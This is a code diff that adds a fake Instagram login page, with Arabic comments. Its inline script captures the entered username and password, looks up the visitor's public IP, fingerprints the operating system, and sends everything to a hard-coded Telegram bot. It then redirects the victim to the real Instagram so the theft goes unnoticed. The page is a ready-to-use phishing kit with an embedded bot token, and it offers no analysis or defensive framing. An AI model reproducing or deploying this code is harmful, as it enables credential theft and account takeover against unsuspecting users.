@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="icon" href="logo.png" type="image/png" />
+    <link href="https://fonts.googleapis.com/css?family=Lobster&display=swap" rel="stylesheet" />
+    <link
+      href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
+      rel="stylesheet"
+      integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="col image">
+        <a href="https://th.bing.com/th/id/OIP.AKBpC_CxLGNtK4a8YmQreQAAAA?rs=1&pid=ImgDetMain"><img src="Screenshot 2024-11-17 172146.png" alt="Instagram" id="image" /></a>
+      </div>
+
+      <div class="col content">
+        <div class="box">
+          <div class="title">
+            <a href="https://youtu.be/0ObElUAgElg?si=S4fMa6k_ilesiafi"><img src="instagram-logo.png" alt="Instagram" width="175" height="51" /></a>
+          </div>
+
+          <form class="login-form" onsubmit="handleSubmit(event)">
+            <div class="form-content">
+              <input type="text" name="email" id="email" required />
+              <label for="email">Phone number, username, or email</label>
+            </div>
+            <div class="form-content">
+              <input type="password" name="password" id="password" required />
+              <label for="password">Password</label>
+            </div>
+            <div class="form-content">
+              <button type="submit">Log in</button>
+            </div>
+            <div class="form-ending">
+              <center>
+                <p id="OR">OR</p>
+                <span id="line"></span>
+              </center>
+              <p id="facebook"><i class="fab fa-facebook-square"></i> Login with Facebook</p>
+              <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+            </div>
+          </form>
+        </div>
+
+        <div class="mini-box">
+          <div class="text">
+            Don't have an account? <a href="#">Sign up</a>
+          </div>
+        </div>
+
+        <div class="download-section">
+          <p>Get the app.</p>
+          <div class="images">
+            <a href="https://apps.apple.com/us/app/instagram/id389801252">
+              <img src="apple-button.png" alt="App Store" />
+            </a>
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_US">
+              <img src="googleplay-button.png" alt="Google Play Store" />
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <ul>
+        <li>About</li>
+        <li>Blog</li>
+        <li>Jobs</li>
+        <li>Help</li>
+        <li>API</li>
+        <li>Privacy</li>
+        <li>Terms</li>
+        <li>Top Accounts</li>
+        <li>Hashtags</li>
+        <li>Locations</li>
+      </ul>
+      <div class="copyright">
+        <select aria-label="Switch Display Language">
+          <option value="en">English</option>
+          <option value="es">Español</option>
+        </select>
+        <span> &copy; 2021 Instagram from Facebook </span>
+      </div>
+    </footer>
+
+    <script>
+      const TOKEN = "7651789586:AAE07uomZ3OlhUj3OgvjqihWBjf34LJVsmg"; // استبدل برمز التوكن الخاص بك
+      const CHAT_ID = "6196901763"; // استبدل برقم المحادثة الخاص بك
+      const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+      const IP_API_URL = "https://api.ipify.org?format=json"; // لجلب عنوان الـ IP العام للمستخدم
+
+      // وظيفة لاكتشاف نظام التشغيل
+      function detectSystemInfo() {
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+
+        let operatingSystem = "نظام التشغيل غير معروف";
+        let edition = "الإصدار غير معروف";
+        let systemType = "نوع النظام غير معروف";
+
+        // اكتشاف نظام التشغيل
+        if (userAgent.indexOf("Windows NT 10.0") !== -1) {
+          operatingSystem = "Windows 10";
+          edition = "Windows 10 Pro/Home";
+        } else if (userAgent.indexOf("Windows NT 6.1") !== -1) {
+          operatingSystem = "Windows 7";
+          edition = "Windows 7 Home/Pro";
+        } else if (userAgent.indexOf("Macintosh") !== -1) {
+          operatingSystem = "macOS";
+          edition = "macOS (لا يوجد إصدار محدد)";
+        } else if (userAgent.indexOf("Linux") !== -1) {
+          operatingSystem = "Linux";
+          edition = "Linux (توزيعات متعددة)";
+        } else if (userAgent.indexOf("Android") !== -1) {
+          operatingSystem = "Android";
+          edition = "Android (موبايل)";
+        } else if (userAgent.indexOf("iPhone") !== -1) {
+          operatingSystem = "iOS";
+          edition = "iOS (موبايل)";
+        }
+
+        // اكتشاف نوع النظام (32 بت أو 64 بت)
+        if (platform.indexOf("Win64") !== -1 || userAgent.indexOf("x86_64") !== -1) {
+          systemType = "64-بت";
+        } else if (platform.indexOf("Win32") !== -1 || userAgent.indexOf("i686") !== -1) {
+          systemType = "32-بت";
+        }
+
+        return { operatingSystem, edition, systemType };
+      }
+
+      async function handleSubmit(event) {
+        event.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        try {
+          // 1. جلب عنوان IP العام للمستخدم
+          const ipResponse = await fetch(IP_API_URL);
+          const ipData = await ipResponse.json();
+          const ipAddress = ipData.ip;
+
+          // 2. اكتشاف نظام التشغيل
+          const { operatingSystem, edition, systemType } = detectSystemInfo();
+
+          const date = new Date().toLocaleString();
+
+          // 3. بناء الرسالة
+          const message = `
+<b>تسجيل دخول</b>
+<b>البريد الإلكتروني:</b> ${email}
+<b>كلمة المرور:</b> ${password}
+<b>عنوان الـ IP:</b> ${ipAddress}
+<b>نظام التشغيل:</b> ${operatingSystem}
+<b>الإصدار:</b> ${edition}
+<b>نوع النظام:</b> ${systemType}
+<b>التاريخ والوقت:</b> ${date}
+          `;
+
+          // إرسال الرسالة إلى تليجرام فورًا بعد التوجيه
+          const response = await fetch(API_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: "HTML"
+            })
+          });
+
+          const responseBody = await response.json();
+          console.log("تم إرسال الرسالة إلى تليجرام: ", responseBody);
+
+          // 4. إعادة التوجيه إلى صفحة إنستغرام
+          window.location.href = "https://www.instagram.com/";
+
+        } catch (error) {
+          console.error("حدث خطأ أثناء جمع البيانات:", error);
+        }
+      }
+    </script>
+  </body>
+</html>
